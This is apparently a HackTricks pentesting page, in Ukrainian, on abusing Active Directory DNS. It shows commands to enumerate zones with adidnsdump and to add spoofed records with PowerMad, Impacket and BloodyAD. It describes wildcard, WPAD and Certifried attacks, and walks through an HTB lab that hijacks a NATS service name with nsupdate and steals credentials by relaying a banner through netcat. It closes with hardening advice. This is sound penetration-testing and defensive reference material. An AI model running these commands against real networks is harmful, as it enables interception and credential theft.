# Записи DNS AD

{{#include ../../banners/hacktricks-training.md}}

За замовчуванням **будь-який користувач** в Active Directory може **перелічити всі записи DNS** у DNS-зонах домену або лісу, подібно до передавання зони (користувачі можуть переглядати дочірні об’єкти DNS-зони в середовищі AD).

Інструмент [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) дає змогу **перелічувати** й **експортувати** **всі записи DNS** у зоні для розвідки внутрішніх мереж.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```

>  adidnsdump v1.4.0 (квітень 2025 року) додає виведення у форматі JSON/Greppable (`--json`), багатопотокове розпізнавання DNS і підтримку TLS 1.2/1.3 під час підключення до LDAPS  

Докладніше читайте [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Створення / змінення записів (ADIDNS spoofing)

Оскільки група **Authenticated Users** за замовчуванням має дозвіл **Create Child** у DACL зони, будь-який обліковий запис домену (або комп’ютера) може реєструвати додаткові записи. Це можна використовувати для перехоплення трафіку, примусу до NTLM relay або навіть повної компрометації домену.

### PowerMad / Invoke-DNSUpdate (PowerShell)

```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```

### Impacket – dnsupdate.py  (Python)

```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```

*(dnsupdate.py постачається з Impacket ≥0.12.0)*

### BloodyAD

```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```

---

## Поширені примітиви атак

1. **Wildcard-запис** – `*.<zone>` перетворює AD DNS-сервер на відповідь для всього підприємства, подібну до спуфінгу LLMNR/NBNS. Його можна використати для захоплення NTLM-хешів або їх relay до LDAP/SMB. (Потрібно вимкнути WINS-lookup.)<sup>[[1]](#references)</sup>    
2. **Перехоплення WPAD** – додайте `wpad` (або запис **NS**, що вказує на хост зловмисника, щоб обійти Global-Query-Block-List) і прозоро проксіюйте вихідні HTTP-запити, щоб викрасти облікові дані. Microsoft усунула обходи через wildcard/DNAME (CVE-2018-8320), але **записи NS досі працюють**.<sup>[[1]](#references)</sup>    
3. **Перехоплення застарілого запису** – захопіть IP-адресу, яка раніше належала робочій станції, і пов’язаний із нею запис DNS усе ще вказуватиме на цю адресу. Це дає змогу виконувати атаки resource-based constrained delegation або Shadow-Credentials, не змінюючи DNS.    
4. **Спуфінг DHCP → DNS** – у типовому розгортанні Windows DHCP+DNS неавтентифікований зловмисник у тій самій підмережі може перезаписати будь-який наявний запис A (зокрема записи контролерів домену), надсилаючи підроблені DHCP-запити, які ініціюють динамічні оновлення DNS (Akamai “DDSpoof”, 2023). Це дає змогу виконати атаку посередника на Kerberos/LDAP і може призвести до повного захоплення домену.<sup>[[2]](#references)</sup>    
5. **Certifried (CVE-2022-26923)** – змініть `dNSHostName` облікового запису комп’ютера, який ви контролюєте, зареєструйте відповідний запис A, а потім запросіть сертифікат для цього імені, щоб видати себе за DC. Інструменти на кшталт **Certipy** або **BloodyAD** повністю автоматизують цей процес.  

Запис AD DNS із [серіалізованою інформацією про ціль](../ntlm/README.md#ntlm--kerberos-reflection-via-serialized-spns-cve-2025-33073) може бути частиною умовного ланцюжка relay: викликачеві потрібні права на створення записів, шлях примусового автентифікування, який змушує цільовий комп’ютер автентифікуватися під цим ім’ям, і ціль relay, яка приймає отриману автентифікацію. Оцінюйте протокол цілі окремо: підпис SMB на вхідному з’єднанні сам по собі не визначає, чи прийме ціль HTTPS WinRM relay. Результат може залежати від рівня виправлень, обробки імен, Extended Protection і конфігурації служби.

---

### Перехоплення внутрішньої служби через застарілі динамічні записи (приклад NATS)

Якщо динамічні оновлення відкриті для всіх автентифікованих користувачів, **скасовану назву служби можна знову зареєструвати й спрямувати на інфраструктуру зловмисника**. На DC Mirage HTB після очищення DNS залишилося ім’я хоста `nats-svc.mirage.htb`, тож будь-який користувач із низькими привілеями міг:<sup>[[3]](#references)</sup>

1. **Переконатися, що запис відсутній**, і дізнатися SOA за допомогою `dig`:

```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```

2. **Повторно створіть запис**, спрямований на зовнішній/VPN-інтерфейс, який вони контролюють:

```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```

3. **Видайте себе за сервіс без шифрування**. Клієнти NATS очікують побачити один банер `INFO { ... }` перед надсиланням облікових даних, тож достатньо скопіювати справжній банер із реального брокера, щоб викрасти секрети:

```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```

Будь-який клієнт, який розпізнає перехоплене ім’я, негайно здійснить leak свого JSON-фрейму `CONNECT` (зокрема `"user"`/`"pass"`) слухачу. Запуск офіційного бінарного файла `nats-server -V` на хості атакувальника, вимкнення редагування журналів або просте перехоплення сеансу у Wireshark дають ті самі облікові дані у відкритому тексті, оскільки TLS був необов’язковим.

4. **Pivot зі здобутими creds** – у Mirage викрадений обліковий запис NATS надавав доступ до JetStream, де були історичні події автентифікації з повторно придатними іменами користувачів/паролями AD.

Цей шаблон застосовується до кожної інтегрованої з AD служби, що покладається на незахищені TCP-handshake (HTTP API, RPC, MQTT тощо): щойно запис DNS перехоплено, атакувальник стає службою.
Опис переліку даних на стороні брокера та роботи зі збереженими повідомленнями див. у [NATS / JetStream pentesting](../../network-services-pentesting/4222-pentesting-nats.md).

---

## Виявлення та посилення захисту

* Забороніть **Authenticated Users** право *Create all child objects* у чутливих зонах і делегуйте динамічні оновлення окремому обліковому запису, який використовується DHCP.
* Якщо потрібні динамічні оновлення, налаштуйте зону на **Secure-only** і ввімкніть **Name Protection** у DHCP, щоб лише об’єкт комп’ютера-власника міг перезаписувати власний запис.
* Відстежуйте ідентифікатори подій DNS Server 257/252 (динамічне оновлення), 770 (передавання зони) і записи LDAP у `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Блокуйте небезпечні імена (`wpad`, `isatap`, `*`) за допомогою завідомо безпечного запису або через Global Query Block List.
* Оновлюйте DNS-сервери — наприклад, вразливості RCE CVE-2024-26224 і CVE-2024-26231 отримали оцінку **CVSS 9.8** і дають змогу віддалено атакувати контролери домену.  



## References

- [1] [ADIDNS знову: WPAD, GQBL та інше](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
- [2] [Підміна записів DNS через зловживання динамічними оновленнями DNS у DHCP](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage: ланцюжок витоків NFS, зловживання Dynamic DNS, викрадення облікових даних NATS, секрети JetStream і Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Входження в зону: дамп DNS Active Directory за допомогою adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
{{#include ../../banners/hacktricks-training.md}}
